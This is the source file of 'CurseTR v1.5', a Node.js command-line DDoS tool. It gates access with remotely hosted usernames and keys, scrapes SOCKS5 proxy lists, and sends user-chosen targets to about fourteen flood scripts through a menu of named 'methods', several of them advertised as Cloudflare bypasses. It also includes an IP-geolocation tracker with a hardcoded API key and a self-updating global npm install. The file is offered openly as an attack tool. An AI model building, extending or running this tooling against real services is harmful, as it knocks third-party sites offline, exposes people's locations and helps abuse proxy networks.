#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.5'
let processList = [];
const cyan = '\x1b[96m'
const birumuda = '\x1b[94m';
const ungu = '\x1b[35m';
const back_cyanmuda = '\x1b[48;5;14m';  // Cyan muda
const back_cyan = '\x1b[48;5;6m';       // Cyan
const back_ungumuda = '\x1b[48;5;13m'; // Ungu muda
const ungumuda = '\x1b[95m';
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const back_biru = '\x1b[48;5;57m';
const back_ungu = '\x1b[48;5;93m';
const back_ungutua = '\x1b[48;5;55m,';
const back_merah = '\x1b[48;5;196m';
const teksmerah = '\x1b[31m';
const merah = '\x1b[38;5;196m';
const tebal = '\x1b[1m';
const Reset = '\x1b[0m';
const biru = '\x1b[34m'
const hijau = '\x1b[38;2;144;238;144m'

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
  const date = new Date();
  const year = date.getFullYear();
  const month = (date.getMonth() + 1).toString().padStart(2, '0');
  const day = date.getDate().toString().padStart(2, '0');
  
  const activeAttacks = processList.length;
console.clear()
console.log(`${hijau}{ System }${Reset} Welcome ${usernameInput} To CurseTR Tools ⠀⠀⠀⠀⠀⠀⠀
${ungumuda}⠀⠀⠈⠳⠭⣦⣖⣥⡠⠚⠁⡉⠛⣤⣏⠇⢢${Reset}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${ungumuda}⠀⠀⠀⠀⠀⣀⠈⠙⠺⣦⢠⠃⠔⠀⢟⣶⡂⡆${Reset}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${ungumuda}⠀⠀⠀⠤⣒⡀⠼⢠⡦⢼⣯⣠⠄⣀⢻⣻⡗⢱${Reset}⠀⠀⠀⠀⠀ ⠀ ${Reset}${back_merah}Welcome to CurseTR v1.5 DDoS${Reset}⠀⠀
${ungumuda}⠠⣀⠤⠄⣀⡈⠑⠪⡙⣎⡿⡯⡚⠉⠠⢻⠑⢆⢂${Reset}⠀⠀⠀ ⠀⠀ ${Reset}${back_merah}DDoS Tools Powerfull | Not C2 ${Reset}
${ungumuda}⠀⠀⠉⠒⠤⣀⡉⢉⡛⡕⠾⢶⡆⠖⠀⢀⠑⠀⠙⠆⢠${Reset}⠀⠀⠀ ⠀${ungu}${bold}___________________________________${Reset}⠀⠀⠀
${ungumuda}⠰⣶⢶⡶⠆⢀⣉⣾⣿⣇⢁⠀⣶⠶⣰⢎⣷⣆⡀⠱⣸⣆${Reset}⠀⠀  ${bold}Owner : t.me/rloo11${Reset}
${ungumuda}⠀⠀⠈⠉⠉⠑⢄⡆⢄⡀⠈⡇⠛⡕⢧⢹⠈⢻⡿⣄⠀⠉⣳${Reset}⠀⠀⠀${bold}Max time : 99999${Reset}
${ungumuda}⠀⠀⠀⠀⠀⠀⢀⢬⣷⣿⣞⣓⣲⣼⠀⠑⠳⣼⣳⡏⢾⣎⢃${Reset}⠀⠀⠀${bold}My Team : @ctr_ofc${Reset}⠀⠀
${ungumuda}⠀⠀⠀⠀⠈⠳⠬⠇⠶⢩⡒⠻⠿⠿⠳⣤⣀⣀⡀⠀⢮⢽⡌⢄${Reset}⠀⠀${bold}Version : ${version}${Reset}
${ungumuda}⠀⠀⠀⠀⠀⠀⠉⠓⠰⡠⡷⠠⢶⢸⣿⡥⠘⠀⠫⣥⡈⠃⠾⠆${Reset}⠀ ${back_ungu}${bold}Vip${Reset}${back_biru}:${bold}Yes${Reset}
${ungumuda}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⣠⡉⠣⣴⡀⠀⠀⢠⣽⡥⣀⡀⠾${Reset} ${bold}Expired : 111111 Millenium${Reset}
${ungumuda}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠶⣠⠛⢻⢆⠈⢵⣦⠀⠀⠀⠙⢳⠕⣢${Reset} ${bold}Date : [ ${day}/${month}/${year}${Reset} ]
${ungumuda}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠲⣇⠀⢾⣧⡀⠀⠐⠓⢾⡵${Reset} 
${ungumuda}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡬⡇⠈⡯⣿⣀⣀${Reset}⠀⠀⠀⠀⠀⠀
${ungumuda}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠀⠄⠛⠉⠉${Reset}⠀⠀⠀⠀⠀⠀
     ${back_merah}\x1b[1mT:ME/RLOO11${Reset}
${cyan}\x1b[1m> Type "${Reset}help${cyan}${bold}" To Start <${Reset}${bold} | ► Login As : ${usernameInput}${Reset}
  ${bold}If you find any error contact me${Reset} 
${ungu}${bold}____________________________________________________________${Reset}`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/AyamKioot/ByCtr/refs/heads/main/useragent4.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');  
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
let usernameInput = ''; // V global

async function displayLoading() {
  for (let i = 1; i <= 100; i++) {
    process.stdout.write(`\rLoading... ${i}%`);
    await new Promise((resolve) => setTimeout(resolve, 2)); // Speed load
  }
  console.log("\n\x1b[38;2;144;238;144m{ System }\x1b[0m Loading complete!");
}

async function bootup() {
  try {
    await displayLoading(); // Menampilkan loading 1% hingga 100%

    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);

    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Rloo1197/serios/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text();

    if (version === latestVersion.trim()) {
  const getUsernameList = await fetch('https://raw.githubusercontent.com/pvroo11/woilahsec/refs/heads/main/uspew.txt'); // File untuk username
  const validUsernames = (await getUsernameList.text()).split("\n").map((user) => user.trim());

  const getPasswordKey = await fetch('https://raw.githubusercontent.com/pvroo11/woilahsec/refs/heads/main/pews.txt'); // File untuk password/key
  const validKeys = (await getPasswordKey.text()).split("\n").map((key) => key.trim());  // Mengambil beberapa key

      permen.question(`${back_biru}${cyan}Input ${Reset}${back_ungu}${cyan}Username${Reset}: `, async (inputUsername) => {
        usernameInput = inputUsername.trim();  // Menyimpan username yang dimasukkan

        if (validUsernames.includes(usernameInput)) {
          console.log(`${hijau}{ System }${Reset} Username Valid`);
          permen.question(`${back_biru}${cyan}Input ${Reset}${back_ungu}${cyan}key${Reset}: `, async (inputKey) => {
            if (validKeys.includes(inputKey.trim())) {
              console.log(`${hijau}{ System }${Reset} Successfully Logged`);
              await scrapeProxy();
              await scrapeUserAgent();
              await sleep(500);
              console.clear();

              // Tampilkan username yang dimasukkan setelah login berhasil
              console.log(`${hijau}{ System }${Reset} ${bold}Hello, ${usernameInput} WELCOME !!${Reset} | Version ${version}`);
              await sleep(1300);
              await banner();
              console.log(``);
              sigma();
            } else {
              console.log(`${merah}{ Error }${Reset} Wrong Key`);
              process.exit(-1);
            }
          });
        } else {
          console.log(`${teksmerah}{ Error }${Reset} Username Not Available`);
          process.exit(-1);
        }
      });
    } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting Auto Update...`);
      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Installing update`);
      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Restart Tools Please`);
      process.exit();
    }
  } catch (error) {
    console.log(`${teksmerah}{ Error }${Reset} Turn on your wifi network`);
  }
}
// [========================================] //
async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  if (processList.length === 0) {
    console.log("\n\x1b[31m{ System }\x1b[0m No attacks in progress\n");
    return;
  }

  processList.forEach((process) => {
    console.log(`
${bold}${ungu}│${Reset}                   HOST                  ${ungu}${bold}│${Reset} SINCE ${bold}${ungu}│${Reset} DURATION ${bold}${ungu}│${Reset} METHOD     ${bold}${ungu}│${Reset}
${bold}${ungu}├─────────────────────────────────────────┼───────┼──────────┼────────────┤${Reset}
${bold}${ungu}│${Reset}  ${process.target.padEnd(34)}     ${bold}${ungu}│${Reset}${Math.floor((Date.now() - process.startTime) / 1000).toString().padStart(5)}  ${bold}${ungu}│${Reset}${process.duration.toString().padStart(8)}  ${bold}${ungu}│${Reset} ${process.methods.padEnd(10)} ${bold}${ungu}│${Reset}\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`${teksmerah}\n{ System }${Reset} Example: attack <url/ip> <duration> <methods>\n
attack https://google.com 500 flood${Reset}`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
const date = new Date();
const year = date.getFullYear();
const month = (date.getMonth() + 1).toString().padStart(2, '0');
const day = date.getDate().toString().padStart(2, '0');


console.clear();
console.log(`${hijau}{ System }${Reset} Attack in progress 
 ⠀${ungu}⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧ ${Reset}${back_putih}${bold}${merah}ATTACK - DETAILS${Reset}⠀⠀⠀⠀⠀
⠀⠀${ungu}⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇  ${Reset}Status :   [ ${hijau}ATTACK HAS SUCESSFULL${Reset} ]⠀⠀⠀⠀⠀
⠀⠀${ungu}⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇  ${Reset}Target :   [ ${cyan}${target}${Reset} ]⠀⠀⠀
⠀⠀${ungu}⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇  ${Reset}Duration : [ ${cyan}${duration}${Reset} ]⠀⠀⠀
⠀⠀${ungu}⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇  ${Reset}Methods :  [ ${cyan}${methods}${Reset} ]⠀⠀⠀⠀
⠀ ${ungu}⡄⠉⠙⠛⠛⠛⠿⠿⠁${Reset}\x1b[38;5;81m⣴⣦${Reset}${ungu}⠈⠻⠛⠛⠛⢛⣉⣁⡤${Reset} ${Reset}${back_putih}${bold}${merah}TARGET - DETAILS${Reset}
⠀⠀${ungu}⠈⠉⠛⠻⠿⠶⣶⣆${Reset}\x1b[38;5;81m⠈⢿⡿⠃${Reset}${ungu}⣠⣶⡿⠿⠟⠛⠉${Reset}   ${Reset}AS :       [ ${cyan}${result.as}${Reset} ]
⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀ ⣠⣤⣤⣤⣶⣶⣿⣿⡀  ${Reset}IP :       [ ${cyan}${result.query}${Reset} ]⠀⠀⠀⠀
⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇  ${Reset}ISP :      [ ${cyan}${result.isp}${Reset} ]⠀
⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗ ${back_putih}${bold}${merah}CREDITS${Reset}⠀⠀⠀
⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀   ${Reset}Owner :    [ ${cyan}@Rloo11${Reset} ]⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀ ⠀⠀⠀⠀${Reset}Telegram : [ ${cyan}t.me/rloo11${Reset} ]⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ${bold}Sent On: ${day}/${month}/${year}${Reset} ${bold}| ► Login As : ${usernameInput}${Reset}
${hijau}>${bold} Please After Attack Type${Reset} ${cyan}'clr'${Reset} ${hijau}${bold}For Back To Home${bold} <${Reset}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
 if (methods === 'flood') {
   pushMonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
         } else if (methods === 'pidoras') {
      pushMonitor(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt `)
        sigma()
          } else if (methods === 'tls') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt `)
        sigma()
          } else if (methods === 'browser') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt `)
     	sigma()
          } else if (methods === 'blast') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt `)
     	sigma()
          } else if (methods === 'kill') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
         } else if (methods === 'bypass') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
         } else if (methods === 'https') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
         } else if (methods === 'thunder') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'storm') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 4 proxy.txt`)
          sigma()
          } else if (methods === 'glory') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'cloudflare') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'quantum') {
       pushMonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'slim') {
       monitorAttack(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
          sigma()
          } else {
    console.log(`${teksmerah} { System }${Reset} Method ${methods} not recognized, Please restart the tool`);
  }
};
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`${teksmerah}{ System }${Reset} Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();
    console.clear()
    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀
  ${ungu}⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠠⡄⠉⠙⠛⠛⠛⠿⠿⠁${Reset}${cyan}⣴⣦${Reset}${ungu}⠈⠻⠛⠛⠛⢛⣉⣁⡤${Reset}⠀⠀⠀⠀⠀
⠀⠀${ungu}⠈⠉⠛⠻⠿⠶⣶⣆${Reset}${cyan}⠈⢿⡿⠃${ungu}⣠⣶⡿⠿⠟⠛⠉${Reset}⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ${hijau}${bold} Tracking IP Address Result ${Reset} ${bold}| ► Login As : ${usernameInput}${Reset}
${hijau}${bold}> Type${Reset} ${cyan}'clr'${Reset} ${hijau}${bold}For Back To Home <${Reset}
${ungu}${bold}─────────────────────────────────────────────────────────────${Reset}
${bold} > Flags :  ${Reset}      [ ${cyan}${ipInfo.country_flag}${Reset} ]
${bold} > Country :  ${Reset}    [ ${cyan}${ipInfo.country_name}${Reset} ]
${bold} > Capital:  ${Reset}     [ ${cyan}${ipInfo.country_capital}${Reset} ]
 ${bold}> City :    ${Reset}     [ ${cyan}${ipInfo.city}${Reset} ]
 ${bold}> ISP :   ${Reset}       [ ${cyan}${ipInfo.isp}${Reset} ]
${bold} > Organization :${Reset} [ ${cyan}${ipInfo.organization}${Reset} ]
${bold} > Lat :     ${Reset}     [ ${cyan}${ipInfo.latitude}${Reset} ]
 ${bold}> Long :    ${Reset}     [ ${cyan}${ipInfo.longitude}${Reset} ]
  ${bold}Google Maps:    [ ${cyan}https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}${Reset} ]
${ungu}${bold}─────────────────────────────────────────────────────────────${Reset}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
${bold}
𝚃𝚑𝚊𝚗𝚔𝚜 𝚃𝚘:
God
Roo
Xlamper
Priyyxl
Irpan
Octo/Pmo
Reja
Faith
Indihome 
${Reset}
`          
permen.question(`${back_ungu}${bold} ${usernameInput} |${Reset}${back_biru}${bold} @DD${Reset}${back_biru}${bold}oS${Reset}${back_biru}${bold}.console${Reset} ${back_putih}${teksmerah}►${Reset} `, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`  ${ungu}
${bold}_____________________________________________________________${Reset}
 methods     ${ungumuda}${bold}│${Reset} Show List of Available Method
 track-ip    ${ungumuda}${bold}│${Reset} Track ip Adress With Info
 kill-wifi   ${ungumuda}${bold}│${Reset} Kill Your Wifi
 monitor     ${ungumuda}${bold}│${Reset} Show Monitor Attack
 credits     ${ungumuda}${bold}│${Reset} Show Creator
 clr         ${ungumuda}${bold}│${Reset} Clear Terminal 
${ungumuda}${bold}─────────────────────────────────────────────────────────────${Reset}
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`   
${ungumuda}${bold}────────────────────────────────────────────────────${Reset}
${bold} ► VIP         L A Y E R 7              
${ungumuda}${bold}────────────────────────────────────────────────────${Reset}
 NAME       ${ungumuda}${bold}│${Reset} DESCRIPTION              ${ungumuda}${bold}│${Reset} DURATION${Reset}
${ungumuda}${bold}____________│__________________________│____________${Reset}
 flood     ${ungumuda}${bold} │ ${Reset}HTTP(s) Flood DoS        ${ungumuda}${bold}│${Reset} ∞ 
 pidoras   ${ungumuda}${bold} │ ${Reset}High DDos Flood Server   ${ungumuda}${bold}│${Reset} ∞
 tls       ${ungumuda}${bold} │${Reset} TLS 1.3                  ${ungumuda}${bold}│${Reset} ∞
 kill      ${ungumuda}${bold} │${Reset} Bypass Cf DDos methods   ${ungumuda}${bold}│${Reset} ∞
 glory     ${ungumuda}${bold} │ ${Reset}The Mix Attack.          ${ungumuda}${bold}│${Reset} ∞
 blast     ${ungumuda}${bold} │ ${Reset}Burst Traffic            ${ungumuda}${bold}│${Reset} ∞
 cloudflare${ungumuda}${bold} │ ${Reset}Bypass Cf                ${ungumuda}${bold}│${Reset} ∞
 bypass    ${ungumuda}${bold} │ ${Reset}Bypass with high power   ${ungumuda}${bold}│${Reset} ∞
 browser   ${ungumuda}${bold} │ ${Reset}XMLHttp Request          ${ungumuda}${bold}│${Reset} ∞
 https     ${ungumuda}${bold} │ ${Reset}Https Flood Traffic      ${ungumuda}${bold}│${Reset} ∞
 thunder   ${ungumuda}${bold} │ ${Reset}Massive Power Methods    ${ungumuda}${bold}│${Reset} ∞
 destroy   ${ungumuda}${bold} │${Reset} Kill Socket              ${ungumuda}${bold}│${Reset} ∞
 quantum   ${ungumuda}${bold} │ ${Reset}Bypass Protection        ${ungumuda}${bold}│${Reset} ∞
 attack    ${ungumuda}${bold} │ ${Reset}Launch DDoS Attack       ${ungumuda}${bold}│${Reset} ∞
${ungumuda}${bold}───────────────────────────────────────────────────${Reset}
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'monitor') {
    monitorAttack()
    sigma()
  } else if (command === 'clr') {
    banner(`\n\n`)
    sigma()
    } else {
    console.log(`\n${teksmerah}{ System } ${Reset}${command} not found\n `);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()
